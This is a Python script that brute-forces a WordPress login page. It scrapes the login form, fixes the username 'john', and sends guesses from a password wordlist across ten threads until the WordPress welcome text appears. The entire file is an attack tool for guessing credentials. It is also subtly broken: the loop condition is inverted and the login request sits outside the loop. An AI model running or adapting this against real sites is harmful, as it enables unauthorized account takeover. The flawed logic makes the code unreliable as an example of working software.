from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress!'
TARGET = 'https://example.com?'
WORDLIST = "cain.txt"

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()

    tree = etree.parse(BytesIO(content), parser)

    for elem in tree.findall('//input'): # find all input element
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)

    return params


class Bruter():
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print('Finished the setup where username = %s\n' % username)

    def web_bruter(self, passwords):
        session = requests.Session()
        respo0 = session.get(self.url)

        params = get_params(respo0.content)
        params['log'] = self.username

        while not passwords.empty() and self.found:
            time.sleep(5)

            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

        resp1 = session.post(self.url, data=params)
        if SUCCESS in resp1.content.decode():
            self.found = True
            print(f"\nBruteForcing successful.")

            print("Username is %s" % self.username)
            print("Password is %s\n" % passwd)
            print("done: now cleaning up other threads . . .")
        else:
            print("Not Found")

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

def main():
    words = get_words()
    b = Bruter("john", TARGET)
    b.run_bruteforce(words)

if __name__ == "__main__":
    main()